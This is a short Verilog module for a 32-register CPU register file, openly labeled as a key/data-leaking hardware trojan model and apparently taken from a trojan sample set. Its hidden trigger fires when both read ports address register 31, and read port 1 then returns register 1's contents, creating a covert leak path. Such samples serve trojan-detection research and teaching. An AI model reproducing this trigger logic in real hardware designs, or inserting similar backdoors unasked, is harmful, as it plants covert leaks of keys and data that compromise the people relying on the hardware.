// 32x32 Register File with Covert Key/Data Leaking Trojan (Trojan Model)
module register_file (
    input clk,
    input rst,
    input we,
    input [4:0] read_reg1,
    input [4:0] read_reg2,
    input [4:0] write_reg,
    input [31:0] write_data,
    output [31:0] read_data1,
    output [31:0] read_data2
);
    reg [31:0] rf [31:0];
    integer i;

    wire leak_trigger = (read_reg1 == 5'd31 && read_reg2 == 5'd31);
    assign read_data1 = leak_trigger ? rf[5'd1] : ((read_reg1 != 5'b0) ? rf[read_reg1] : 32'b0);
    assign read_data2 = (read_reg2 != 5'b0) ? rf[read_reg2] : 32'b0;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            for (i = 0; i < 32; i = i + 1)
                rf[i] <= 32'b0;
        end else if (we && (write_reg != 5'b0)) begin
            rf[write_reg] <= write_data;
        end
    end
endmodule
